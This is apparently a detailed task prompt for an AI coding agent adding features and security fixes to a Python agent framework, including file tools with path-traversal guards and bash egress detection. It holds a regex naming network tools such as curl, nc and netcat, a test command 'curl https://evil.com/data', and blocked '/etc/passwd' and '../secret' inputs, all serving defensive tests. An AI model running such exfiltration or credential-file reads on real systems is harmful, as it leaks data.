# Phase 8a Worker Prompt — claw-python-personal

You are a worker agent implementing Phase 8a improvements to the `claw-python-personal` project. Follow every instruction precisely. Do not skip steps. Do not invent new patterns — mirror the existing code style at all times.

---

## Context

- **Working directory:** `/home/martin/Desktop/claw-python-personal/`
- **Current state:** 137 tests passing, 0 failures
- **Platform:** Jetson Orin Nano, Python 3.11+
- **Test command:** `pytest tests/ -x --tb=short`

The project is a production-grade AI agent framework. The codebase uses:
- `from __future__ import annotations` at the top of every module
- `dataclasses` for data models
- `async/await` for all I/O
- `X | None` syntax (never `Optional[X]`)
- `@tool(...)` decorator from `claw/tools/registry.py` to register tools

**Do not** add new mandatory dependencies. `httpx` is already in `pyproject.toml`.

---

## Key File Map (read these before starting)

- `claw/tools/registry.py` — `@tool` decorator, `_registry` dict, `execute()`, `get_definitions()`
- `claw/tools/__init__.py` — currently empty (1 blank line); imports here trigger tool registration at startup
- `claw/tools/bash.py` — example of a simple tool using `@tool`
- `claw/tools/memory_tools.py` — example of a tool that receives `session_id` as a kwarg
- `claw/agent/loop.py` — `AgentLoop`, `_infer_egress_dest()` at line 33
- `claw/sandbox/docker_runner.py` — Docker container creation; the tmpfs block is at line 146–150
- `claw/memory/manager.py` — `MemoryManager.search(query, session_id, limit)`
- `claw/memory/sqlite_store.py` — SQL layer; `vector_search` filters by `session_id` post-KNN; `fts_search` uses `WHERE v.session_id = ?` when `session_id` is not None

---

## Tasks (implement in this exact order)

---

### Task 1 — Fix tmpfs noexec security issue (1-line area change)

**File:** `claw/sandbox/docker_runner.py`

**Lines 146–150** currently read:

```python
tmpfs={
    "/tmp": f"size={tmp_size_mb}m,exec",
    "/run": "size=8m",
    "/var/tmp": "size=8m",
},
```

Replace with:

```python
tmpfs={
    "/tmp": f"size={tmp_size_mb}m,noexec,nosuid",
    "/run": "size=8m,noexec,nosuid",
    "/var/tmp": "size=8m,noexec,nosuid",
},
```

This removes the `exec` mount flag (which allowed binary execution from tmpfs) and adds `noexec,nosuid` — a critical security hardening for the sandbox.

No other changes to this file.

---

### Task 2 — Create `web_fetch` tool

**Create new file:** `claw/tools/web_fetch.py`

```python
from __future__ import annotations
import httpx
from claw.tools.registry import tool


@tool(
    name="web_fetch",
    description="Fetch content from a URL. Returns the response body as text (HTML/JSON/plain text). Use for reading web pages, APIs, or any HTTP resource.",
    parameters={
        "type": "object",
        "properties": {
            "url": {
                "type": "string",
                "description": "The URL to fetch (must include http:// or https://)",
            },
            "method": {
                "type": "string",
                "enum": ["GET", "POST"],
                "default": "GET",
                "description": "HTTP method",
            },
            "headers": {
                "type": "string",
                "description": "Optional JSON object of extra headers",
            },
            "body": {
                "type": "string",
                "description": "Optional request body for POST",
            },
            "timeout": {
                "type": "integer",
                "default": 15,
                "description": "Request timeout in seconds",
            },
        },
        "required": ["url"],
    },
    requires_main=False,
)
async def web_fetch(
    url: str,
    method: str = "GET",
    headers: str = "{}",
    body: str = "",
    timeout: int = 15,
    session_id: str = "agent:main",
) -> str:
    """Fetch a URL and return response content."""
    import json
    try:
        extra_headers = json.loads(headers) if headers and headers != "{}" else {}
    except Exception:
        extra_headers = {}

    try:
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
            if method.upper() == "POST":
                resp = await client.post(url, content=body.encode() if body else b"", headers=extra_headers)
            else:
                resp = await client.get(url, headers=extra_headers)

        content_type = resp.headers.get("content-type", "")
        text = resp.text
        # Truncate very large responses
        if len(text) > 10000:
            text = text[:10000] + f"\n[truncated — original {len(resp.content)} bytes]"
        return f"[HTTP {resp.status_code}] {text}"
    except httpx.TimeoutException:
        return f"Error: Request to {url} timed out after {timeout}s"
    except httpx.RequestError as e:
        return f"Error: {e}"
```

**Important integration note:** `claw/agent/loop.py` line 37 already handles `web_fetch` in `_infer_egress_dest`:

```python
if tool_name in ("web_fetch", "browser_navigate"):
    url = tool_input.get("url", "")
    if "://" in url:
        parts = url.split("/")
        return parts[2] if len(parts) > 2 else None
```

So egress policy will automatically gate this tool. **Do not modify `loop.py` for this task.**

**Register the tool:** Open `claw/tools/__init__.py`. It is currently empty (one blank line). Add:

```python
from claw.tools import web_fetch as _web_fetch  # noqa: F401
```

---

### Task 3 — Create File Tools

**Create new file:** `claw/tools/file_tools.py`

All file operations are workspace-sandboxed. Paths are always relative to `~/.claw/workspaces/{session_id}/`. Absolute paths and `../` traversal must be rejected.

```python
from __future__ import annotations

import os
from pathlib import Path

from claw.tools.registry import tool


def _resolve_workspace(session_id: str) -> Path:
    """Return the workspace path for a session."""
    safe_id = session_id.replace(":", "_")
    return Path(os.path.expanduser(f"~/.claw/workspaces/{safe_id}"))


def _safe_path(workspace: Path, rel_path: str) -> Path | None:
    """Resolve rel_path within workspace, return None if outside workspace."""
    if os.path.isabs(rel_path):
        return None
    resolved = (workspace / rel_path).resolve()
    try:
        resolved.relative_to(workspace.resolve())
        return resolved
    except ValueError:
        return None


@tool(
    name="file_read",
    description="Read a file from the session workspace. path must be relative to workspace root.",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Relative file path within workspace"},
            "max_lines": {"type": "integer", "default": 200, "description": "Maximum lines to return"},
        },
        "required": ["path"],
    },
    requires_main=False,
)
async def file_read(path: str, max_lines: int = 200, session_id: str = "agent:main") -> str:
    workspace = _resolve_workspace(session_id)
    safe = _safe_path(workspace, path)
    if safe is None:
        return "Error: path traversal or absolute path not allowed"
    if not safe.exists():
        return f"Error: file not found: {path}"
    if not safe.is_file():
        return f"Error: not a file: {path}"
    try:
        lines = safe.read_text(encoding="utf-8", errors="replace").splitlines()
        if len(lines) > max_lines:
            truncated = lines[:max_lines]
            return "\n".join(truncated) + f"\n[truncated — {len(lines)} total lines]"
        return "\n".join(lines)
    except Exception as e:
        return f"Error reading file: {e}"


@tool(
    name="file_write",
    description="Write content to a file in the session workspace. Creates parent directories as needed. path must be relative.",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Relative file path within workspace"},
            "content": {"type": "string", "description": "File content to write"},
            "append": {"type": "boolean", "default": False, "description": "Append instead of overwrite"},
        },
        "required": ["path", "content"],
    },
    requires_main=False,
)
async def file_write(path: str, content: str, append: bool = False, session_id: str = "agent:main") -> str:
    workspace = _resolve_workspace(session_id)
    safe = _safe_path(workspace, path)
    if safe is None:
        return "Error: path traversal or absolute path not allowed"
    try:
        safe.parent.mkdir(parents=True, exist_ok=True)
        if not append:
            safe.write_text(content, encoding="utf-8")
        else:
            with open(safe, "a", encoding="utf-8") as f:
                f.write(content)
        return f"Written {len(content)} chars to {path}"
    except Exception as e:
        return f"Error writing file: {e}"


@tool(
    name="file_list",
    description="List files in a directory within the session workspace.",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "default": ".", "description": "Relative directory path (default: workspace root)"},
        },
    },
    requires_main=False,
)
async def file_list(path: str = ".", session_id: str = "agent:main") -> str:
    workspace = _resolve_workspace(session_id)
    safe = _safe_path(workspace, path)
    if safe is None:
        return "Error: path traversal or absolute path not allowed"
    if not safe.exists():
        return f"Error: directory not found: {path}"
    if not safe.is_dir():
        return f"Error: not a directory: {path}"
    try:
        entries = sorted(safe.iterdir(), key=lambda p: (p.is_file(), p.name))
        lines = []
        for entry in entries:
            kind = "FILE" if entry.is_file() else "DIR "
            size = entry.stat().st_size if entry.is_file() else "-"
            lines.append(f"{kind}  {entry.name}  ({size} bytes)")
        return "\n".join(lines) if lines else "(empty directory)"
    except Exception as e:
        return f"Error listing directory: {e}"


@tool(
    name="file_delete",
    description="Delete a file from the session workspace. Cannot delete directories.",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Relative file path within workspace"},
        },
        "required": ["path"],
    },
    requires_main=False,
)
async def file_delete(path: str, session_id: str = "agent:main") -> str:
    workspace = _resolve_workspace(session_id)
    safe = _safe_path(workspace, path)
    if safe is None:
        return "Error: path traversal or absolute path not allowed"
    if not safe.exists():
        return f"Error: file not found: {path}"
    if safe.is_dir():
        return "Error: cannot delete directories"
    try:
        safe.unlink()
        return f"Deleted {path}"
    except Exception as e:
        return f"Error deleting file: {e}"
```

**Register the tools:** Add to `claw/tools/__init__.py`:

```python
from claw.tools import file_tools as _file_tools  # noqa: F401
```

After Task 2 and Task 3, `claw/tools/__init__.py` should contain:

```python
from claw.tools import web_fetch as _web_fetch  # noqa: F401
from claw.tools import file_tools as _file_tools  # noqa: F401
```

---

### Task 4 — Add bash egress detection in `_infer_egress_dest`

**File:** `claw/agent/loop.py`

The `bash` tool currently returns `None` from `_infer_egress_dest`, so no egress check is applied even when the command makes network calls (e.g. `curl`, `wget`, `pip install`).

**Current `_infer_egress_dest` (lines 33–42):**

```python
def _infer_egress_dest(tool_name: str, tool_input: dict) -> str | None:
    """Infer egress destination hostname from tool call."""
    if tool_name == "search":
        return "duckduckgo.com"
    if tool_name in ("web_fetch", "browser_navigate"):
        url = tool_input.get("url", "")
        if "://" in url:
            parts = url.split("/")
            return parts[2] if len(parts) > 2 else None
    return None
```

**Also add this import** near the top of the file (after the existing `import json` line, around line 8):

```python
import re
```

**Replace the entire `_infer_egress_dest` function** with:

```python
_NETWORK_PATTERN = re.compile(
    r'\b(curl|wget|requests|httpx|urllib|nc\b|netcat|ssh|scp|rsync|pip\s+install|apt\s+install)\b',
    re.IGNORECASE,
)


def _infer_egress_dest(tool_name: str, tool_input: dict) -> str | None:
    """Infer egress destination hostname from tool call."""
    if tool_name == "search":
        return "duckduckgo.com"
    if tool_name in ("web_fetch", "browser_navigate"):
        url = tool_input.get("url", "")
        if "://" in url:
            parts = url.split("/")
            return parts[2] if len(parts) > 2 else None
    if tool_name == "bash":
        command = tool_input.get("command", "")
        if _NETWORK_PATTERN.search(command):
            url_match = re.search(r'https?://([^\s/\'"]+)', command)
            if url_match:
                return url_match.group(1)
            return "external-network"
    return None
```

Place the `_NETWORK_PATTERN` module-level constant immediately before the `_infer_egress_dest` function definition (i.e. replace the standalone function with the constant + the new function).

**Verification:** After this change, `_infer_egress_dest("bash", {"command": "curl https://evil.com/data"})` must return `"evil.com"`.

---

### Task 5 — Memory session isolation for child agents

**File:** `claw/tools/memory_tools.py`

**Background:** Review `claw/memory/sqlite_store.py` first.

- `vector_search(query_emb, session_id, limit)`: When `session_id` is not `None`, it filters results post-KNN by calling `_row_matches_session`. When `session_id=None`, all sessions' memories are returned.
- `fts_search(query, session_id, limit)`: When `session_id` is not `None`, it appends `AND v.session_id = ?`. When `session_id=None`, all sessions' memories are returned.

**Current `memory_search`** already passes `session_id` to `_memory_manager.search(query, session_id, limit)`. This means **main session** (`session_id="agent:main"`) only searches its own memories — which is correct.

**The gap:** A child session (`session_id` starting with `"agent:child:"`) currently also passes its own `session_id`, so it is already isolated. However, to be explicit and prevent any future regression where a caller passes `session_id=None` or overrides the session, add a guard at the top of `memory_search`:

Replace the current `memory_search` function body with:

```python
async def memory_search(
    query: str, limit: int = 5, session_id: str = "agent:main"
) -> str:
    if _memory_manager is None:
        return "Error: MemoryManager not initialized"
    # Child sessions must never search across other sessions.
    # Passing session_id ensures the SQL WHERE clause filters correctly.
    # If session_id is falsy for any reason, default to main to prevent cross-session leakage.
    effective_session_id: str | None = session_id if session_id else "agent:main"
    results = await _memory_manager.search(query, effective_session_id, limit)
    if not results:
        return "(No relevant memory)"
    lines = [
        f"[{r['created_at'][:10]}] (score={r['score']:.2f}) {r['content'][:200]}"
        for r in results
    ]
    return "\n".join(lines)
```

The key behavioral change: `session_id` is never allowed to be `None` when calling `_memory_manager.search`. This ensures child sessions cannot read main session memories even if the caller somehow passes `None`.

**Also apply the same guard to `memory_save`:** Replace the call `await _memory_manager.save(session_id, content, metadata)` to ensure `session_id` is always set (it already is in the current code — just verify and leave as-is if correct).

---

### Task 6 — Write Tests

#### 6a. Create `tests/test_web_fetch.py`

```python
from __future__ import annotations

import pytest
from unittest.mock import AsyncMock, MagicMock, patch


@pytest.mark.asyncio
async def test_web_fetch_get_success():
    """Mock httpx to return 200, verify response includes [HTTP 200]."""
    from claw.tools.web_fetch import web_fetch

    mock_response = MagicMock()
    mock_response.status_code = 200
    mock_response.text = "Hello, world!"
    mock_response.content = b"Hello, world!"
    mock_response.headers = {"content-type": "text/plain"}

    mock_client = AsyncMock()
    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
    mock_client.__aexit__ = AsyncMock(return_value=False)
    mock_client.get = AsyncMock(return_value=mock_response)

    with patch("httpx.AsyncClient", return_value=mock_client):
        result = await web_fetch("https://example.com")

    assert "[HTTP 200]" in result
    assert "Hello, world!" in result


@pytest.mark.asyncio
async def test_web_fetch_timeout():
    """Mock httpx to raise TimeoutException, verify error message."""
    import httpx
    from claw.tools.web_fetch import web_fetch

    mock_client = AsyncMock()
    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
    mock_client.__aexit__ = AsyncMock(return_value=False)
    mock_client.get = AsyncMock(side_effect=httpx.TimeoutException("timed out"))

    with patch("httpx.AsyncClient", return_value=mock_client):
        result = await web_fetch("https://example.com", timeout=5)

    assert "timed out" in result.lower()
    assert "example.com" in result


@pytest.mark.asyncio
async def test_web_fetch_truncation():
    """Return content > 10000 chars, verify truncation message."""
    from claw.tools.web_fetch import web_fetch

    large_content = "x" * 15000
    mock_response = MagicMock()
    mock_response.status_code = 200
    mock_response.text = large_content
    mock_response.content = large_content.encode()
    mock_response.headers = {"content-type": "text/html"}

    mock_client = AsyncMock()
    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
    mock_client.__aexit__ = AsyncMock(return_value=False)
    mock_client.get = AsyncMock(return_value=mock_response)

    with patch("httpx.AsyncClient", return_value=mock_client):
        result = await web_fetch("https://example.com")

    assert "truncated" in result
    assert len(result) < 15000 + 200  # should be significantly shorter than original
```

#### 6b. Create `tests/test_file_tools.py`

```python
from __future__ import annotations

import pytest
from pathlib import Path
from unittest.mock import patch

from claw.tools.file_tools import file_read, file_write, file_list, file_delete


def _workspace_for(tmp_path: Path, session_id: str) -> Path:
    """Return patched workspace path."""
    safe_id = session_id.replace(":", "_")
    ws = tmp_path / ".claw" / "workspaces" / safe_id
    ws.mkdir(parents=True, exist_ok=True)
    return ws


@pytest.mark.asyncio
async def test_file_write_and_read(tmp_path):
    """Write a file, read it back, verify content."""
    session_id = "agent:main"
    ws = _workspace_for(tmp_path, session_id)

    with patch("claw.tools.file_tools._resolve_workspace", return_value=ws):
        write_result = await file_write("hello.txt", "Hello, claw!", session_id=session_id)
        read_result = await file_read("hello.txt", session_id=session_id)

    assert "Hello, claw!" in read_result
    assert "Error" not in write_result


@pytest.mark.asyncio
async def test_file_list(tmp_path):
    """Write 2 files, list directory, verify both appear."""
    session_id = "agent:main"
    ws = _workspace_for(tmp_path, session_id)

    with patch("claw.tools.file_tools._resolve_workspace", return_value=ws):
        await file_write("alpha.txt", "aaa", session_id=session_id)
        await file_write("beta.txt", "bbb", session_id=session_id)
        listing = await file_list(".", session_id=session_id)

    assert "alpha.txt" in listing
    assert "beta.txt" in listing


@pytest.mark.asyncio
async def test_file_delete(tmp_path):
    """Write then delete, verify file is gone."""
    session_id = "agent:main"
    ws = _workspace_for(tmp_path, session_id)

    with patch("claw.tools.file_tools._resolve_workspace", return_value=ws):
        await file_write("to_delete.txt", "bye", session_id=session_id)
        delete_result = await file_delete("to_delete.txt", session_id=session_id)
        read_result = await file_read("to_delete.txt", session_id=session_id)

    assert "Error" not in delete_result
    assert "not found" in read_result


@pytest.mark.asyncio
async def test_file_path_traversal_blocked(tmp_path):
    """Attempt ../secret path traversal, verify error."""
    session_id = "agent:main"
    ws = _workspace_for(tmp_path, session_id)

    with patch("claw.tools.file_tools._resolve_workspace", return_value=ws):
        result = await file_read("../secret", session_id=session_id)

    assert "Error" in result
    assert "traversal" in result.lower() or "not allowed" in result.lower()


@pytest.mark.asyncio
async def test_file_absolute_path_blocked(tmp_path):
    """Attempt /etc/passwd absolute path, verify error."""
    session_id = "agent:main"
    ws = _workspace_for(tmp_path, session_id)

    with patch("claw.tools.file_tools._resolve_workspace", return_value=ws):
        result = await file_read("/etc/passwd", session_id=session_id)

    assert "Error" in result
    assert "not allowed" in result.lower()
```

#### 6c. Create `tests/test_security_fixes.py`

```python
from __future__ import annotations

import pytest


def test_tmpfs_noexec():
    """Verify that tmpfs options contain noexec and not exec."""
    import importlib
    import inspect
    import claw.sandbox.docker_runner as dr

    source = inspect.getsource(dr)
    # noexec must be present
    assert "noexec" in source, "noexec flag missing from docker_runner tmpfs config"
    # bare 'exec' mount option must not appear (the string 'exec' may appear in 'noexec', that's fine)
    # Check that the old pattern ',exec"' or 'size=...m,exec' is gone
    assert ",exec\"" not in source, "exec mount flag still present in docker_runner tmpfs config"
    assert "nosuid" in source, "nosuid flag missing from docker_runner tmpfs config"


def test_bash_egress_detection():
    """_infer_egress_dest should detect curl with URL and return the hostname."""
    from claw.agent.loop import _infer_egress_dest

    result = _infer_egress_dest("bash", {"command": "curl https://evil.com/data"})
    assert result == "evil.com", f"Expected 'evil.com', got {result!r}"
```

---

## Expected Test Count

| Category | Count |
|---|---|
| Base (existing) | 137 |
| test_web_fetch.py | +3 |
| test_file_tools.py | +5 |
| test_security_fixes.py | +2 |
| **Target total** | **147** |

---

## Requirements Checklist

1. All tests pass with `pytest tests/ -x --tb=short`
2. No new mandatory dependencies (`httpx` is already in `pyproject.toml`)
3. Every new file starts with `from __future__ import annotations`
4. Use `X | None` not `Optional[X]`
5. All tool handler functions are `async`
6. `claw/tools/__init__.py` imports both new tool modules so they register on startup
7. Do not modify any file not listed in these tasks

---

## Execution Order Summary

1. Edit `claw/sandbox/docker_runner.py` (tmpfs lines 146–150)
2. Create `claw/tools/web_fetch.py`
3. Create `claw/tools/file_tools.py`
4. Edit `claw/tools/__init__.py` (add two import lines)
5. Edit `claw/agent/loop.py` (add `import re`, add `_NETWORK_PATTERN`, update `_infer_egress_dest`)
6. Edit `claw/tools/memory_tools.py` (update `memory_search` body)
7. Create `tests/test_web_fetch.py`
8. Create `tests/test_file_tools.py`
9. Create `tests/test_security_fixes.py`
10. Run `pytest tests/ -x --tb=short` and verify 147 tests pass

---

## Final Report

After all tests pass, report:
- Each file created or modified (absolute path)
- Final test count from pytest output
- Any issues encountered and how they were resolved
